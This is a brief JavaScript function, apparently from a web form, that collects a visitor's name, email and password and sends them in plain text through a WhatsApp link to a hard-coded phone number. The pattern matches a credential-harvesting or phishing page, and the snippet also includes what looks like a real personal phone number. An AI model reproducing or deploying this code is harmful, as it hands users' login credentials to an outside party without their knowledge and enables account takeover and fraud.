function send(){
    let number=+919174684969;
    let name = document.getElementById('name').value;
    let email = document.getElementById('emil').value;
    let password = document.getElementById('password').value;


	var url = "https://wa.me/" + number + "?text="
	+ "Name : " +name+ "%0a"
    + "Username : " +email+ "%0a"
    + "Password : " +password+ "%0a";

    window.open(url, '_blank').focus();
}